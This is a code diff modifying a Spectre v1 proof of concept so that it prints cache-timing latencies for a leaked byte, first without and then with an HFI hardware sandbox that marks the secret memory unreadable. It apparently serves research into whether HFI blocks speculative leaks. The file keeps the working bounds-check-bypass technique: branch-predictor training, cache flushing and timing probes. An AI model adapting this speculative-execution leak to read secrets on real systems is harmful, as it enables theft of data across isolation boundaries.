@@ -27,6 +27,12 @@
 const char *public_data = "Hello, world!";
 const char private_data[] __attribute__ ((aligned (128))) = "It's a s3kr3t!!!";
 
+// Uncomment to enable hfi emulation
+// #define HFI_EMULATION3
+
+// outside the root folder of this repo
+#include "../hw_isol_gem5/tests/test-progs/hfi/hfi.h"
+
 // Leaks the byte that is physically located at &text[0] + offset, without ever
 // loading it. In the abstract machine, and in the code executed by the CPU,
 // this function does not load any memory except for what is in the bounds
@@ -35,7 +41,7 @@ const char private_data[] __attribute__ ((aligned (128))) = "It's a s3kr3t!!!";
 // Instead, the leak is performed by accessing out-of-bounds during speculative
 // execution, bypassing the bounds check by training the branch predictor to
 // think that the value will be in-range.
-static char LeakByte(const char *data, size_t offset) {
+static char LeakByte(const char *data, size_t offset, uint64_t* avg_char_latencies) {
   TimingArray timing_array;
   // The size needs to be unloaded from cache to force speculative execution
   // to guess the result of comparison.
@@ -45,7 +51,7 @@ static char LeakByte(const char *data, size_t offset) {
   std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
       new size_t(strlen(data)));
 
-  for (int run = 0;; ++run) {
+  for (int run = 0; run < 100; ++run) {
     timing_array.FlushFromCache();
     // We pick a different offset every time so that it's guaranteed that the
     // value of the in-bounds access is usually different from the secret value
@@ -81,29 +87,84 @@ static char LeakByte(const char *data, size_t offset) {
     }
 
     int ret = timing_array.FindFirstCachedElementIndexAfter(data[safe_offset]);
-    if (ret >= 0 && ret != data[safe_offset]) {
-      return ret;
-    }
-
-    if (run > 100) {
-      std::cerr << "Does not converge" << std::endl;
-      exit(EXIT_FAILURE);
+    for (size_t i = 0; i < 256; i++) {
+      avg_char_latencies[i] += saved_char_latencies[i];
     }
   }
+
+  for (size_t i = 0; i < 256; i++) {
+    avg_char_latencies[i] /= 100;
+  }
+
+  for (size_t i = 0; i < 256; i++) {
+    if (avg_char_latencies[i] <= 2*saved_threadhold) {
+      return (char) i;
+    }
+  }
+
+  return 0;
+}
+
+size_t round_to_next_pow2(size_t val) {
+  size_t power = 1;
+  while(power < val) {
+    power *= 2;
+  }
+  return power;
+}
+
+void printLatencyForFirstByte() {
+  const size_t private_offset = private_data - public_data;
+
+  uint64_t avg_char_latencies[256]{0};
+  std::cout << "Printing latencies for the first byte: " << LeakByte(public_data, private_offset, avg_char_latencies) << ". Should be 'I' if HFI disabled, incorrect char if HFI enabled.\n";
+  std::cout << "Threshold: " << saved_threadhold << "\n";
+  // std::cout << "Runs taken: " << out_runs_taken << "\n";
+  std::cout << "[";
+  for (size_t i = 0; i < 256; i++) {
+    const char * sep = i == 0? "" : ", ";
+    std::cout << sep << avg_char_latencies[i];
+  }
+  std::cout << "]\n";
 }
 
 int main() {
-  const size_t private_data_len = strlen(private_data);
+  printLatencyForFirstByte();
 
-  std::cout << "Leaking the string: ";
-  std::cout.flush();
-  const size_t private_offset = private_data - public_data;
-  for (size_t i = 0; i < private_data_len; ++i) {
-    // On at least some machines, this will print the i'th byte from
-    // private_data, despite the only actually-executed memory accesses being
-    // to valid bytes in public_data.
-    std::cout << LeakByte(public_data, private_offset + i);
-    std::cout.flush();
-  }
-  std::cout << "\nDone!\n";
+  /////////////////////////////////////////////
+
+  hfi_sandbox sandbox;
+  memset(&sandbox, 0, sizeof(hfi_sandbox));
+
+  sandbox.is_trusted_sandbox = false;
+
+  sandbox.code_ranges[0].base_mask = 0;
+  sandbox.code_ranges[0].ignore_mask = 0;
+  sandbox.code_ranges[0].executable = 1;
+
+  // First region --- mark private_data as inaccessible
+  const size_t private_data_len = strlen(private_data);
+  const size_t private_data_len_pow2 = round_to_next_pow2(private_data_len);
+  sandbox.data_ranges[0].base_mask = reinterpret_cast<uintptr_t>(private_data);
+  sandbox.data_ranges[0].ignore_mask = ~reinterpret_cast<uint64_t>(private_data_len_pow2 - 1);
+  sandbox.data_ranges[0].readable = 0;
+  sandbox.data_ranges[0].writeable = 0;
+
+  // Second region --- mark all (remaining) addresses as accessible
+  sandbox.data_ranges[1].base_mask = 0;
+  sandbox.data_ranges[1].ignore_mask = 0;
+  sandbox.data_ranges[1].readable = 1;
+  sandbox.data_ranges[1].writeable = 1;
+
+  hfi_set_sandbox_metadata(&sandbox);
+  hfi_enter_sandbox();
+
+  /////////////////////////////////////////////
+
+  std::cout << "Rerunning with HFI enabled\n";
+  printLatencyForFirstByte();
+
+  /////////////////////////////////////////////
+
+  hfi_exit_sandbox();
 }
